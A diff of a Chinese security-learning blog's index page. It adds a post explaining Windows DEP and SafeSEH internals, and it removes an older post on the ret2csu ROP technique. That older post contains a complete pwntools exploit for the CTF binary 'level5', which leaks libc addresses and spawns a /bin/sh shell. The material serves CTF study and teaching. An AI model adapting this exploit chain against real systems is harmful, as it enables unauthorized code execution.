@@ -252,6 +252,179 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/03/01/windows安全保护机制-DEP浅析/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Asa9ao">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Asa9ao">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/03/01/windows安全保护机制-DEP浅析/" itemprop="url">windows安全保护机制--DEP浅析</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-03-01T17:23:43+08:00">
+                2019-03-01
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h3 id="windows安全保护机制–DEP浅析"><a href="#windows安全保护机制–DEP浅析" class="headerlink" title="windows安全保护机制–DEP浅析"></a>windows安全保护机制–DEP浅析</h3><p>在温哥华Pwn2Own黑客大赛中，微软windows 7系统的ASLR技术和DEP技术都被选手成功绕过，但不可否认，ASLR和DEP确实是如微软IE小组经理所说，是“非常有效的保护机制”。</p>
+<p>溢出攻击可谓是最常见的攻击手段之一，本质上溢出攻击都是利用了现代计算机体系结构上的设计缺陷，而重塑整个体系必然是不现实的，于是就有了各种各样的保护机制来弥补。<em>在Windows XP SP2之前，利用代码（exp）会在分配的内存页执行，不需要检查<a href="http://msdn.microsoft.com/en-us/library/aa366786%28VS.85%29.aspx" target="_blank" rel="noopener">内存保护常量</a>（Memory Protection Constants）。例如，如果使用指定分配权限为PAGE_READWRITE 的<a href="http://msdn.microsoft.com/en-us/library/aa366887.aspx" target="_blank" rel="noopener">VirtualAlloc ()</a>函数分配了内存页, 则仍然可以从该内存页执行代码。从 windows XP SP2 和 windows Server 2003 SP1 开始, 如果 CPU 支持执行禁用 (XD) （针对Intel CPU）或不可执行 (NX)（针对AMD CPU) 位，则任何从被标记为PAGE_READWRITE（例）的内存页执行代码的行为，都将触发 STATUS_ACCESS_VIOLATION (0xC0000005) 访问冲突异常。</em>而微软在windows xp sp2上开始提供的DEP，全称为数据执行保护，英文为Data Execution Prevention，则是一种更加有效的修补手段。</p>
+<p>DEP根据其实现机制的不同分为硬件DEP和软件DEP，linux上的NX即为硬件DEP，而windows提供NX和SafeSEH（即为软件DEP）两种机制。一句话概括其功能：对于部分内存页不给予执行权限。</p>
+<h2 id="硬件DEP"><a href="#硬件DEP" class="headerlink" title="硬件DEP"></a>硬件DEP</h2><p>硬件DEP的实现需要CPU的支持，其中AMD cpu提供了No-Execute Page-Protection（就是NX），而intel则是Execute Disable Bit（XD），可以在”我的电脑”-&gt;右键菜单”属性”-&gt;”高级”-&gt;”性能 - 设置”-&gt;”数据执行保护”或者是在C:\boot.ini来设置相关选项和查看cpu是否支持DEP，分为四种模式，一般计算机提供的是前两种：</p>
+<ul>
+<li>optout模式，除了指定的程序以外其他的程序都使用</li>
+<li><p>optin模式，只为windows的程序和服务开启</p>
+</li>
+<li><p>AlwaysOn模式，所有进程强制开启，仅支持64位（不建议开启，某些dll并不能开启）</p>
+</li>
+<li>AlwaysOff模式，所有进程强制关闭</li>
+</ul>
+<p>硬件DEP的实现机制是操作系统通过设置内存页的NX/XD属性标记，来指明不能从该内存执行代码。为了实现这个功能，需要在内存的页面表（Page Table）中加入一个特殊的标识位（NX/XD）来标识是否允许在该页上执行指令。当该标识位设置为0里表示这个页面允许执行指令，设置为1时表示该页面不允许执行指令。在64位的操作系统中也就是页表项的第63bit，而在32位的操作系统中略显复杂，因为32位的pte并没有多余的bit可以存放这个标识位，所以要利用PAE进行扩展，在没有PAE的情况下32位的系统不支持<em>硬件DEP</em></p>
+<p><img src="https://ws3.sinaimg.cn/large/006tKfTcly1g0mj4b63s0j31ci0u0tmy.jpg" alt="image-20190228225631962"></p>
+<p>那它在底层到底是如何实现的呢？我们可与通过VirtualProtect()这个api函数来深入探索，这个函数的具体功能就是改变指定的内存页的属性，该函数的调用链如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">VirtualProtect() --&gt; VirtualProtectEx() --&gt; ZwProtectVirtualMemory()</span><br></pre></td></tr></table></figure>
+<p>接着通过sysenter进入内核，调用号为0x89，相应的调用是NtProtecVirtualMemory()，之后调用链如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NtProtecVirtualMemory() --&gt; MiProtectVirtualMemory() --&gt; MiFlushTbAndCapture() --&gt; KeInterlockedSwapPte()</span><br></pre></td></tr></table></figure>
+<p>注意，其中在MiProtectVirtualMemory()中，会计算出要改变其bit的内存页的PTE的地址，最后由KeInterlockedSwapPte()来改变指定PTE的属性。</p>
+<p>来看看其汇编代码进行分析</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">nt!KeInterlockedSwapPte:</span><br><span class="line">80541c08 53 push ebx</span><br><span class="line">80541c09 56 push esi</span><br><span class="line">80541c0a 8b5c2410 mov ebx,dword ptr [esp+10h] ;ebx为新的PTE的地址</span><br><span class="line">80541c0e 8b74240c mov esi,dword ptr [esp+0Ch] ;esi为旧的PTE地址</span><br><span class="line">80541c12 8b4b04 mov ecx,dword ptr [ebx+4] ;ecx为新PTE值高双字</span><br><span class="line">80541c15 8b1b mov ebx,dword ptr [ebx] ;ebx为PTE值低双字</span><br><span class="line">80541c17 8b5604 mov edx,dword ptr [esi+4] ;edx为旧PTE值高双字</span><br><span class="line">80541c1a 8b06 mov eax,dword ptr[esi] ;eax为旧PTE值低双字</span><br><span class="line">80541c1c 0fc70e cmpxchg8b qword ptr [esi];比较新旧是否相等，如果不想等用新的代替旧的</span><br></pre></td></tr></table></figure>
+<h2 id="软件DEP"><a href="#软件DEP" class="headerlink" title="软件DEP"></a>软件DEP</h2><p>SafeSEH则是一种在软件层面实现的对SEH的保护机制，它需要操作系统和编译器的双重支持，在vs2013及以后的版本中会自动启用 /SafeSEH 链接选项来使用SafeSEH。也正是因为该项技术使得以往简单的覆盖异常处理句柄的漏洞利用几乎失效了</p>
+<p>在加载PE文件时，SafeSEH将定位合法的SEH表的地址（如果该映像不支持SafeSEH的话则地址为0），然后是用共享内存中的一个随机数进行加密处理，程序中所有的异常处理函数的地址提取出来汇总放入SEH表，并将该表放入程序映像中，还会将将加密后的SEH函数表地址，IMAGE的开始地址，IMAGE的长度，合法SEH函数的个数，作为一条记录放入ntdll（ntdll模块是进行异常分发的模块）的加载模块数据内存中,每次调用异常处理函数时都会进行校验，只有二者一致才能够正常进行，该处理由RtlDispatchException() 开始，首先会经历两次检查，分别是：</p>
+<ul>
+<li>检查异常处理链是否在当前的栈中，不是则终止</li>
+<li>检查异常处理函数的指针是否指向栈，是则终止</li>
+</ul>
+<p>通过两次检查后会调用RtlIsValidHandler() 来进行异常的有效性检查，08年的black hat给出了该函数的细节</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">RtlIsValidHandler</span><span class="params">( handler )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (handler is in the loaded image)      <span class="comment">// 是否在loaded的空间内</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (image has <span class="built_in">set</span> the IMAGE_DLLCHARACTERISTICS_NO_SEH flag) <span class="comment">//是否设置了忽略异常</span></span><br><span class="line">            <span class="keyword">return</span> FALSE;                  </span><br><span class="line">        <span class="keyword">if</span> (image has a SafeSEH table)       <span class="comment">// 是否含有SEH表</span></span><br><span class="line">            <span class="keyword">if</span> (handler found in the table)  <span class="comment">// 异常处理函数地址是否表中</span></span><br><span class="line">                <span class="keyword">return</span> TRUE;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">return</span> FALSE;</span><br><span class="line">        <span class="keyword">if</span> (image is a .NET assembly with the ILonl	y flag <span class="built_in">set</span>)</span><br><span class="line">            <span class="keyword">return</span> FALSE;                    </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (handler is on non-executable page)   <span class="comment">// handler是否在不可执行页上</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (ExecuteDispatchEnable bit <span class="built_in">set</span> in the process flags) <span class="comment">//DEP是否开启</span></span><br><span class="line">            <span class="keyword">return</span> TRUE;                     </span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            raise ACCESS_VIOLATION;          </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (handler is <span class="keyword">not</span> in an image)          <span class="comment">// handler是否在未加载空间</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (ImageDispatchEnable bit <span class="built_in">set</span> in the process flags) <span class="comment">//设置的标志位是否允许</span></span><br><span class="line">            <span class="keyword">return</span> TRUE;                     </span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;                             /s/ 允许执行异常处理函数</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>代码中的ExecuteDispatchEnable和ImageDispatchEnable位标志是内核KPROCESS结构的一部分，这两个位用来控制当异常处理函数在不可以执行内存或者不在异常模块的映像（IMAGE）内时，是否执行异常处理函数。这两个位的值可以在运行时修改，不过默认情况下如果进程的DEP被关闭，则这两个位置1，如果进程的DEP是开启状态，则这两个位被置0。</p>
+<p>通过源码我们可以看出，RtlIsValidHandler() 函数只会在以下几种情况执行异常处理函数</p>
+<ul>
+<li><p>在进程的DEP是开启的情况下</p>
+<ul>
+<li><p>异常处理函数和进程映像的SafeSEH表匹配且没有NO_SEH标志。</p>
+</li>
+<li><p>异常处理函数在进程映像的可执行页，并且没有NO_SEH标志，没有SafeSEH表，没有.NET的ILonly标志。</p>
+</li>
+</ul>
+</li>
+<li><p>在进程的DEP关闭的情况下</p>
+<ul>
+<li><p>异常处理函数和进程映像的SafeSEH表匹配没有NO_SEH标志。</p>
+</li>
+<li><p>异常处理函数在进程映像的可执行页，并且没有NO_SEH标志，没有SafeSEH表，没有.NET的ILonly标志。</p>
+</li>
+<li><p>异常处理函数不在当前进程的映像里面，但是不在当前线程的堆栈上。</p>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>看雪翻译小组 <a href="https://bbs.pediy.com/thread-226625.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-226625.htm</a></p>
+<p>safeSEH笔记<a href="http://pstgroup.blogspot.com/2007/08/tipssafeseh.html" target="_blank" rel="noopener">http://pstgroup.blogspot.com/2007/08/tipssafeseh.html</a></p>
+<p>DEP的保护原理<a href="http://netsecurity.51cto.com/art/201107/276497.htm" target="_blank" rel="noopener">http://netsecurity.51cto.com/art/201107/276497.htm</a></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/01/15/how2heap学习（1）/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
@@ -1995,206 +2168,6 @@ r.interactive()
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/26/pwn学习（9）中级ROP（一）/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Asa9ao">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Asa9ao">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/11/26/pwn学习（9）中级ROP（一）/" itemprop="url">pwn学习（9）中级ROP（一）</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-26T21:16:45+08:00">
-                2018-11-26
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
-                  <a href="/categories/pwn/" itemprop="url" rel="index">
-                    <span itemprop="name">pwn</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>周六周末简单复习了一下计算机网络的前三章，稍微撇了几眼数据结构，甚至还试着拿angr去做了做某个比赛的逆向题。。。想想自己还有四级需要准备就有点头疼，不过pwn还是得学啊，中级ROP大概会写两次博客吧</p>
-<h1 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>不知道大家有没有和我一样的经历，拿到一个64程序，看上去漏洞很明显然后就开始想着拿payload覆盖数据，泄漏libc然后重复调用漏洞函数……怎么说呢，思路倒是没什么错，但是忽视了很重要的问题——64位程序传递参数的方式是优先使用寄存器的（准确的说是前6个参数），多出来的才用栈传递，这就限制了我们不能再简单的去用覆盖数据的方式实现函数的调用了。当然，我们还是可以使用gadgets来凑出来的，但是往往没有是那么合适的，这时候，我们可以利用 x64 下的 __libc_csu_init 中的 gadgets。这个函数是用来对 libc 进行初始化操作的，而一般的程序都会调用 libc 函数，所以这个函数一定会存在。<br>为什么呢？下面就来看一看</p>
-<blockquote>
-<p>一下内容来自某英文网站<a href="http://dbp-consulting.com/tutorials/debugging/linuxProgramStartup.html" target="_blank" rel="noopener">http://dbp-consulting.com/tutorials/debugging/linuxProgramStartup.html</a><br><img src="https://ws2.sinaimg.cn/large/006tNbRwly1fxlugqem5tj313u0u0q82.jpg" alt=""><br>图片为32位，作为参考<br>从上图我们可以看到，当运行程序的时候，首先shell会使用 execve() 函数来出发系统调用。这时候系统会为我们的程序分配栈区并将argc、argv、envp压栈，按照shell设定fd，装载器还要进行重定位和调用预初始化器（preinitializers），然后就从_start来执行代码了。<br>利用ida（当然gdb、objdump上面的也一样）来看一下这段代码，重要的部分我都标记了注释<br><img src="https://ws4.sinaimg.cn/large/006tNbRwly1fxlvqgdsruj30ku09ewg8.jpg" alt=""><br>一点一点来看，首先xor了ebp也就是将ebp置为了0，然后紧接着就是pop，也就是将我们的栈顶的值拿了出来，根据之前的execve的压栈方式我们可以知道也就是argc，当我们pop后栈顶就成了argv，一个mov也就让我们成功拿到了，这么说大家也应该明白了，其实之后的几句都是在准备参数。<br>细致分析下来一共有7个参数，前六个按照x64的准则由rsi、rdi、rdx、rcx、r8、r9来传递，第七个则是利用栈来传递的，其中比较重要的参数应该是main的地址，argc、argv以及__libc_csu_init、__libc_csu_fini<br><img src="https://ws2.sinaimg.cn/large/006tNbRwly1fxmp1fev7qj31eu0i8dpr.jpg" alt=""><br>如图所示即调用__libc_start_main时寄存器的情况<br>至于__libc_start_main函数做了什么呢？首先设置了uid和gid，然后启动线程，寄存fini和rtld_fini的参数，调用__libc_csu_init，调用main，调用exit。<br>这里就看到了我们调用程序几乎必然要用到这个函数，所以我们可以利用它来传递寄存器的值</p>
-</blockquote>
-<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>题目是jarvis oj上的level5，首先还是file+checksec+ida<br><img src="https://ws1.sinaimg.cn/large/006tNbRwly1fxls5e0fvrj30iw064t9g.jpg" alt=""><br>漏洞很明显，但程序本身没有system和/bin/sh字符串，所以还是考虑用泄漏libc地址的方式来做。<br>因为程序用过了write函数我们就考虑泄漏它的地址，利用libc_csu_gadgets实现，并且再次跳转回主函数<br>计算出libc的地址，进而拿到execve的地址和/bin/sh字符串的地址<br>再次利用libc_csu_gadgets来将这两个地址写入到bss段，然后执行就好了<br>官方的exp如下<br>    from pwn import *</p>
-<pre><code>#context.log_level = &apos;debug&apos;
-
-level5 = ELF(&apos;./level5.dms&apos;)
-sh = process(&apos;./level5.dms&apos;)
-libc = ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)
-write_got = level5.got[&apos;write&apos;]
-read_got = level5.got[&apos;read&apos;]
-main_addr = level5.symbols[&apos;main&apos;]
-bss_base = level5.bss()
-csu_front_addr = 0x0000000000400600
-csu_end_addr = 0x000000000040061A
-fakeebp = &apos;b&apos; * 8
-
-
-def csu(rbx, rbp, r12, r13, r14, r15, last):
-    # pop rbx,rbp,r12,r13,r14,r15
-    # rbx should be 0,
-    # rbp should be 1,enable not to jump
-    # r12 should be the function we want to call
-    # rdi=edi=r15d
-    # rsi=r14
-    # rdx=r13
-    payload = &apos;a&apos; * 0x80 + fakeebp
-    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
-    payload += p64(csu_front_addr)
-    payload += &apos;a&apos; * 0x38
-    payload += p64(last)
-    sh.send(payload)
-    sleep(1)
-
-
-sh.recvuntil(&apos;Hello, World\n&apos;)
-## RDI, RSI, RDX, RCX, R8, R9, more on the stack
-## write(1,write_got,8)
-csu(0, 1, write_got, 8, write_got, 1, main_addr)
-
-write_addr = u64(sh.recv(8))
-libc_base = write_addr - libc.symbols[&apos;write&apos;]
-execve_addr = libc_base + libc.symbols[&apos;execve&apos;]
-log.success(&apos;execve_addr &apos; + hex(execve_addr))
-##gdb.attach(sh)
-
-## read(0,bss_base,16)
-## read execve_addr and /bin/sh\x00
-sh.recvuntil(&apos;Hello, World\n&apos;)
-csu(0, 1, read_got, 16, bss_base, 0, main_addr)
-sh.send(p64(execve_addr) + &apos;/bin/sh\x00&apos;)
-
-sh.recvuntil(&apos;Hello, World\n&apos;)
-## execve(bss_base+8)
-gdb.attach(sh)
-csu(0, 1, bss_base, 0, 0, bss_base + 8, main_addr)
-sh.interactive()
-</code></pre>
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -2245,7 +2218,7 @@ sh.interactive()
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">31</span>
+                  <span class="site-state-item-count">32</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
